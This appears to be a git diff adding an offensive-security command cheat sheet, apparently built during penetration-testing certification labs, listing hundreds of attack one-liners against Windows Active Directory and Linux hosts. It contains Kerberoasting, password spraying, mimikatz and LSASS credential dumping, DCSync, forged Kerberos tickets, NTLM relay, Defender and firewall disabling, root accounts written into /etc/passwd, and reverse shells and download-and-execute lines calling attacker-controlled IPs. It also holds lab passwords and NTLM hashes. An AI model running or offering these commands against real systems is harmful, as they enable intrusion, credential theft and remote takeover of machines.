@@ -1,0 +1,253 @@
+cat nmap1.txt | grep open | grep -vi disco | awk '{print $1,$3 ,$7 ,$8,$9}'
+hashcat -m 5600 USR.hash --show
+hashcat ntlm: hashcat -m 1000 -a 0 ntlm /usr/share/wordlists/rockyou.txt
+mimikatz: lsadump::lsa /patch
+mimikatz: lsadump::sam
+mimikatz: privilege::debug
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=53 -f exe -o wshell53.exe
+powershell: Get-ADDefaultDomainPasswordPolicy 
+powershell: Get-ADGroup -Filter * | select Name
+powershell: Get-ADGroupMember -Identity 'USRs' | select name
+powershell: Get-ADUser -Filter * | select Name
+powershell: Invoke-DomainPasswordSpray -Userlist .\users.txt -Passwordlist .\Password.txt -Verbose 
+powershell: get-mpcomputerstatus
+powershell: netsh advfirewall show allprofiles
+powerview: Get-DomainPolicy
+powerview: Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
+powerview: get-domaincomputer -Operatingsystem "*10*" | select operatingsystem,dnshostname
+powerview: get-domaincomputer | select cn, operatingsystem
+powerview: get-domaingpo -computername dc01 | select displayname
+powerview: get-domaingroup -username USR -Properties samaccountname
+powerview: get-domaingroupmember -Identity USRs | select membername
+powerview: get-domaingroupmember -name "Domain Admin"
+powerview: get-domainuser | select name, description
+python ~/tools/ntlmrelayx.py -tf targets.txt -smb2support -i
+python3 -m venv venv3; source venv3/bin/activate
+rubeus: .\Rubeus.exe asreproast /usr:USR /outfile:USR.hash 
+rubeus: .\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+sudo mount -t nfs 192.168.178.17:/mount mount -nolock
+sudo timedatectl set-ntp off ;sudo rdate -n IP #clock skew: 
+xpt /home/kenny/tools/GetNPUsers.py  DOMAIN/ -usersfile users.txt -format hashcat -no-pass -request -dc-ip IP | grep -vi sessionerror
+xpt /home/kenny/tools/GetNPUsers.py DOMAIN/USR:PSWD -dc-ip IP -request # reproast
+xpt /home/kenny/tools/kerbrute passwordspray -d DOMAIN --dc IP users.txt PSWD
+xpt /home/kenny/tools/kerbrute passwordspray -d DOMAIN --dc IP users.txt PSWD -v
+xpt /home/kenny/tools/kerbrute userenum -d DOMAIN --dc IP users.txt
+xpt /home/kenny/tools/secretsdump.py -outputfile onesec.hashes -just-dc DOMAIN/USR:PSWD@IP # alle dc dump
+xpt /home/kenny/tools/secretsdump.py -outputfile onesec.hashes -just-dc-ntlm DOMAIN/USR:PSWD@IP #dcsync ntlm hashes
+xpt bloodhound-python -u USR -p PSWD -d DOMAIN -c all --zip -ns IP 
+xpt certipy find -u USR -p PSWD -dc-ip DOMAIN  -dns-tcp -ns IP -bloodhound
+xpt certipy req -username USR -password PSWD -target DOMAIN -ca NARA-CA -template NARAUSER -upn USR@DOMAIN -dc-ip IP -debug
+xpt certipy-ad auth -pfx USR.pfx -domain DOMAIN -username USR -dc-ip IP
+xpt certipy-ad find -u USR -p 'PSWD' -target IP -text -stdout -vulnerable
+xpt certipy-ad find -u USR -p PSWD -dc-ip DOMAIN  -dns-tcp -ns IP -bloodhound
+xpt crackmapexec ldap IP -d DOMAIN -u USR -p PSWD
+xpt evil-winrm -i IP -u USR -p PSWD # shell
+xpt fping -asgq IP/24
+xpt gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -b 404,500 -x php,txt,xml,pdf
+xpt impacket-GetUserSPNs DOMAIN/USR:'PSWD' -dc-ip IP -debug -outputfile kerberoast.txt
+xpt impacket-addcomputer 'DOMAIN/USR:PSWD' -method LDAPS -computer-name Daneel -computer-pass 'Daneel123' -dc-ip IP
+xpt impacket-psexec DOMAIN/USR:'PSWD'@IP # shell
+xpt impacket-psexec DOMAIN/USR:PSWD@IP
+xpt impacket-secretsdump -system system -sam sam local #ntds.dit
+xpt impacket-smbserver kali . -smb2support -username USR -password PSWD 
+xpt ldapsearch -x -b "DC=ONESEC,DC=local" -H "ldap://IP" "(objectclass=*)"
+xpt ldeep ldap -u USR -p "PSWD" -d DOMAIN -s ldap://DOMAIN add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
+xpt nmap -Pn -p- -vvv -A IP -T4 | tee nmap1.txt
+xpt nxc ldap DOMAIN -u USR -p "PSWD" --bloodhound -c all -ns IP
+xpt nxc ldap IP -u users.txt -p passwd100.txt  --continue-on-success | grep + > ldap.txt;cat ldap.txt
+xpt nxc smb IP -M rdp -o ACTION=enable -u USR -p PSWD #enable RDP port on target
+xpt nxc smb IP -u USR -p PSWD --ntds
+xpt nxc smb IP -u USR -p PSWD --rid-brute # userneum
+xpt nxc smb IP -u USR -p PSWD --shares
+xpt nxc smb IP -u USR -p PSWD --users
+xpt nxc smb IP -u users.txt -p passwd100.txt --continue-on-success | grep [+]
+xpt nxc smb IP -u users.txt -p password100.txt --continue-on-success | grep -vi FAIL
+xpt nxc winrm IP -u USR -p PSWD -x whoami
+xpt python3 ntlm_theft.py -g lnk -s IP -f nara
+xpt rdesktop IP -u USR -p PSWD
+xpt rpcclient -U USR IP --password=PSWD
+xpt smbclient //IP/SHARE -U USR --password=PSWD
+xpt sudo python3 scanner.py DOMAIN/USR:PSWD -dc-ip IP -use-ldap #nopac attack
+xpt sudo responder -I eth0 -dPv
+xpt /home/kenny/tools/targetedKerberoast.py -v -d DOMAIN -u USR -p PSWD
+xpt impacket-mssqlclient USR:'PSWD'@IP -windows-auth
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+xpt /usr/share/doc/python3-impacket/examples/GetUserSPNs.py DOMAIN/USR:PSWD -request
+python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -debug
+xpt impacket-getPac -targetUser Administrator DOMAIN/USR:PSWD
+xpt rpcclient -U DOMAIN/USR --password=PSWD --command=enumprivs IP
+xpt rpcclient -U DOMAIN/USR --password=PSWD IP --command=enumdomusers
+xpt rpcclient -U USR --password=PSWD IP --command=lsaquery # domain sid
+xpt rpcclient -U USR --password=PSWD IP --command=lsaenumacctrights 0x452
+Get-ADPrincipalGroupMembership svc_apache$ | select name
+Get-ADUser -Filter {SamAccountName -eq svc_mssql}
+impacket-ticketer -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com
+xpt python3 /usr/share/doc/python3-impacket/examples/GetLAPSPassword.py DOMAIN/USR:PSWD
+dir /s /b | findstr /i 'config'
+for /d /r %i in (*) do @if exist "%i\*" echo %i
+for /d /r %i in (*) do @if exist "%i\*" (echo %i & dir /b "%i") 
+for /r %i in (*) do @if /i not "%~xi"==".lnk"  if /i not "%~xi"==".vmsg" echo %i
+for /r %i in (*.conf) do @echo %i
+ icacls . /grant "Everyone:(OI)(CI)F" /T
+xpt nxc smb IP -u users.txt -p passwords3.txt --local-auth
+net share share=C:\share
+impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.173.152
+xpt impacket-smbclient DOMAIN/USR:'PSWD'@IP
+new-smbshare -Name "sam" -Path "C:\windows.old\windows\system32" -Fullaccess Everyone
+sudo  mount -t cifs //10.10.135.154/myshare ./mount/myshare -o username=kenny,password=Border123,nounix,vers=3.0
+xfreerdp /u:kenny /v:192.168.165.249 /p:Border123! /size:80% /drive:kali,.
+wfuzz -c -z file,lfi-list.txt -b "PHPSESSID=tq0a0m3fml3d9ttsl8d1q6ob9b" --hh 1341 http://192.168.194.209/manage.php?file=../../../../..FUZZ
+/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kenny/oscp/relia/vm02/webdav/
+nxc rdp targets.txt -u allusers.txt -p allpasswords.txt 
+xpt xfreerdp /u:USR /v:IP /p:PSWD /size:90% /clipboard /drive:kali,.
+scp linpeas20.txt kenny@192.168.45.157:/home/kenny/oscp/relia/VM08
+net use K: \192.168.45.157\kali /user:guest Guest123
+net use K: \192.168.45.157\kali /user:guest Guest123
+xpt ldapsearch -x -b "DC=medtech,DC=com" -H "ldap://IP" -D "cn=joe,cn=Users,DC=medtech,DC=COM" -w Flowers1
+xpt ldapsearch -x -b "DC=medtech,DC=com" -H "ldap://IP" -D "cn=joe,cn=Users,DC=medtech,DC=COM" -w Flowers1
+nxc smb 172.16.134.82 -u yoshi -p Mushroom! --pass-pol
+xpt impacket-psexec DOMAIN/USR@IP -hashes :PSWD
+dir /A:-D "creds.txt" /S
+nxc ldap 192.168.120.162 -u chen -p freedom --bloodhound -c all -d sub.poseidon.yzx --dns-server 192.168.120.162
+xpt evil-winrm -i IP -u USR -H PSWD
+xpt rpcclient -U USR IP --password=PSWD --command='"setuserinfo2 jackie 23 Password123"'
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 
+xfreerdp  /cert-ignore /compression /auto-reconnect /u:administrator  /pth:'3bcdd818f7ec942ac91aa30d8db71927' /v:192.168.122.162  /d:sub.poseidon.yzx /tls-seclevel:0 /timeout:8000 /dynamic-resolution /size:90% /clipboard /drive:kali,.
+impacket-ticketer -domain  sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262  -aesKey  b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2  -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator  -extra-pac
+impacket-psexec -k -no-pass sub.poseidon.yzx/administrator@dc01.poseidon.yzx -target-ip 192.168.110.161
+impacket-secretsdump -hashes :3bcdd818f7ec942ac91aa30d8db71927 sub.poseidon.yzx/administrator@192.168.110.162
+xpt rpcclient IP -U USR%3bcdd818f7ec942ac91aa30d8db71927 --pw-nt-hash 
+script -q -c 'nxc smb ../targets10.txt -u ../allusers.txt -p ../allpasswords.txt' output.txt
+iconv -f UTF-16LE -t UTF-8 output.txt -o winpeas.txt
+get-childitem -path c:\windows\ -recurse -force -filter "sam" -erroraction silentlycontinue
+./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+ssh kenny@10.10.144.147 -D9090 -R *:7777:localhost:7777 -R *:8888:localhost:8888
+type C:\users\administrator\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
+Get-PSReadlineOption #powershell history
+ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap
+sudo ntpdate 10.129.95.154 #skew 
+Get-ChildItem -Path . -Filter *.log -Recurse | Select-Object -ExpandProperty FullName
+Get-ChildItem -Path . -Filter *.txt -Recurse | Select-String -Pattern Data -CaseSensitive: | Select-Object -Unique Path
+Get-ChildItem -Path . -Filter *.txt -Recurse | Select-String -Pattern 'Data' -CaseSensitive: | Select-Object -Unique Path
+Get-ChildItem -Path . -Recurse | Where-Object { @(".log", ".txt") -contains $_.Extension } | Select-String -Pattern "data" | Select-Object -Unique Path
+xpt nxc ldap IP -u USR -p 'PSWD' -M maq #machinecount
+chisel server -p 8000 --reverse
+chisel.exe client 192.168.45.157:8000 R:3306:127.0.0.1:3306
+mysql -u root -p -h 127.0.0.1 -P 3306 --skip-ssl
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+python3 ipad-enum.py 'get-netuser | select cn,description'
+get-netgpo
+get-domainsid
+Get-ChildItem -Path "C:\users" -Recurse -Filter "search.ps1"
+xpt nxc2ps.py -U USR -P 'PSWD' -C 'whoami'
+sudo ngrep -q -d eth0 -W byline 'POST' tcp port 80 and host oscpe
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.195.212 -c "powershell -e JABjAGwA.."
+mimikatz: misc::memssp # C:\Windows\System32\mimilsa.log
+cat targets.txt| grep -v No | grep -v Challe|grep -v '^$' > alltargets.txt
+schtasks /query /fo list /v | Tee-Object -FilePath tasks.txt
+impacket-smbserver kali . -smb2support -username guest -password Guest123
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+net use K: \\192.168.45.187\kali /user:guest Guest123 #smbserver
+socat -ddd TCP-LISTEN:22,fork TCP:10.4.216.215:22
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cat initial_targets.txt | grep -v '^$' | grep -v No | grep -v Chal
+snmpwalk -v2c -c public 192.168.242.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+kenny:.3mNRfTHiyIWJrUnP30:0:0:root:/root:/bin/bash  #Password123!
+impacket-secretsdump -ntds ntds.dit -system system local
+hydra -I -l george -P passwords.txt ssh://192.168.125.201 -s 2222
+sekurlsa::tickets
+psql -h 127.0.0.1 -p 5432 -U postgres -d webapp
+sekurlsa::tickets /export
+hashcat dave.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+wpscan --url 192.168.205.244 --enumerate p --plugins-detection aggressive
+./winpeas.exe | tee-object -filepath winpeas.txt
+snmpwalk -v2c -c public 192.168.128.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+sudo ip link set dev tun0 mtu 1200
+impacket-getTGT scrm.local/ksimpson:ksimpson
+export KRB5CCNAME=ksimpson.ccache
+xpt impacket-GetUserSPNs DOMAIN/USR:'PSWD' -dc-host dc1.scrm.local -k -no-pass
+xpt impacket-getPac -targetUser administrator DOMAIN/USR:PSWD # sid
+
+xpt python3 get-sid.py -u USR -p PSWD -d DOMAIN
+xpt impacket-getTGT DOMAIN/USR:'PSWD' #kerberos ticket
+xpt impacket-smbclient -k -no-pass DOMAIN/USR@dc1.DOMAIN -target-ip IP # kerberos
+feroxbuster  --url http://192.168.200.169 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,jpg,xml -s 200 -s 301
+feroxbuster  --url http://192.168.200.169 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,jpg,xml -s 200 -s 301
+curl -i --proxy http://192.168.200.189:3128 http://192.168.200.189:8080 # squid
+sudo ssh -L 80:192.168.233.99:80 ariah@192.168.233.99
+netsh advfirewall firewall show rule name=all | findstr '80'
+cat cewl.txt | tr '[:upper:]' '[:lower:]' > output.txt
+shutdown /r /t 0 # restart reboot
+GodPotato -cmd 'cmd /c c:\users\nathan\desktop\nc.exe -nv 192.168.45.162 53 -e cmd.exe' 
+AddType application/x-httpd-php .dog # htaccess
+invoke-runascs -Username Administrator -Password "14WatchD0g$" -Co
+mmand "whoami" 
+find / -user root -perm -o+w -type f -name "*.sh" 2>/dev/null
+set-mppreference -disablerealtimemonitoring  #bypass av defender
+set-mppreference -disablerealtimemonitoring $true #bypass av defender
+find / -type d -writable 2>/dev/null | grep -v /home/chloe
+curl -X POST -F file=@mimikatz.exe http://172.16.16.107/upload.php #apache2
+i686-w64-mingw32-gcc exploit.c -o syncbreeze_exploit.exe
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+smbclient \\192.168.50.212\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+sudo responder -I tun0 -A
+xpt nxc smb 192.168.208.173 -u USR -p PSWD -M slinky -o SERVER=192.168.45.175 NAME=IMPORTANT
+Get-ChildItem -Path "C:\" -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue
+xpt nxc ldap IP -M groupmembership -o USER='boris.crawford' -u USR -p PSWD
+xpt nxc ldap IP -M get-desc-users -u USR -p PSWD
+xpt nxc ldap IP -M get-userPassword -u USR -p PSWD
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+PowerUp.ps1 - Get-ServiceUnquoted # unquoted service path
+crunch 6 6 -t Lab%%% > crunch.txt
+watch -n 5 "ls -lsa /bin/bash"
+grep "CRON" /var/log/syslog
+echo "kenny:OAXsG3LHHq24A:0:0:root:/root:/bin/bash" >> /etc/passwd
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kenny@192.168.45.221 # reverse ssh
+.\Rubeus.exe asreproast /nowrap
+openssl passwd -1 -salt kenny Border123
+echo 'kenny::0:0::/root:/bin/bash' >> /etc/passwd
+python3 49362.py 192.168.197.240 /proc/self/cmdline
+echo 'kenny::0:0:root:/root:/bin/bash' >> passwd
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.142.215
+netsh advfirewall set allprofiles state off
+runas /user:kenny "powershell -Command Start-Process cmd -Verb runAs"
+Grant-SmbShareAccess -Name "share" -AccountName "Everyone" -AccessRight Full -Force
+Set-ExecutionPolicy Bypass -Scope Process
+Set-MpPreference -DisableRealtimeMonitoring 
+sls "Password" mimikatz.log | Where-Object { $_.Line -notmatch "null" -and $_.Line -notmatch "17" } | ForEach-Object { $_.Line }
+rundll32.exe comsvcs.dll, MiniDump  lsass.exe C:\temp\lsass.dmp full
+Start-Process -NoNewWindow -FilePath ".\chisel.exe" -ArgumentList "client 192.168.45.203:8000 R:3306:127.0.0.1:3306"
+<?php file_put_contents('/tmp/test.txt', 'hello'); ?>
+robocopy /b z:\windows\ntds . ntds.dit
+ssh -N -L 0.0.0.0:4444:127.0.0.1:4444 -i id_rsa gustavo@192.168.197.18
+import-module .\PowerView.ps1
+./Rubeus.exe kerberoast /nowrap
+Invoke-GMSAPasswordReader -Command "--AccountName svc_apache"
+echo -n 'Service1' | iconv -t utf-16le | openssl dgst -md4
+impacket-mssqlclient -k -no-pass nagoya.nagoya-industries.com
+nxc smb 192.168.222.40 -u info -p info -M spider_plus -o DOWNLOAD_FLAG=True
+ldapsearch -x -H ldap://192.168.157.122 -s base
+. .\PowerUp.ps1; Invoke-AllChecks
+curl -F "files=@C:\temp\traffic.pcapng" http://192.168.45.221:8000/upload
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8000
+listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
+nxc ldap -u eric.wallows -p EricLikesRunning800 --bloodhound -c all --dns-server 10.10.131.140 -d oscp.exam 10.10.131.140
+curl -T vuln.txt http://172.16.16.107/vuln.txt #webdav upload
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+dir /s /b /a | findstr /i .ini # search find hidden
+/proc/self/cmdline #lfi
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.204 LPORT=443 EXITFUNC=thread -f raw -o shellcode.raw #badass
+./BadAssMacros.exe -i .\shellcode.raw -s indirect -p no -w doc -o out_210.txt
+curl -sk --cookie "PHPSESSID=v5apisvhbfgr1rmeskhvjo3b88" "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php" | grep -o 'PD9[[:alnum:]+/=]*' | base64 -d
+bloodyAD --host 10.129.191.94 -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+dotnet publish -c Release -r win-x64 --self-contained false #compile vscode naar exe bestand
+dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:IncludeNativeLibrariesForSelfExtract=true #compile vscode naar exe bestand
+"powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8000/run.ps1') | IEX"
+([ADSISearcher]"(&(objectCategory=computer)(name=CLIENT))").FindOne().Properties["ms-mcs-admpwd"] #laps
+bloodyAD --host 192.168.205.120 -d infinity.com -u ted -p e=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+Select-String -Path .\PowerView.ps1 -Pattern "^function" | ForEach-Object { ($_ -split ' ')[1] }
+Get-ChildItem -Recurse -Path "C:\" -File | Where-Object { $_.Extension -eq ".ps1" }
+impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -e ~/osep/challanges/challenge4/159/add_kenny.exe
+evil-winrm -i 172.16.212.166 -u jim@complyedge.com -p 'Password123'
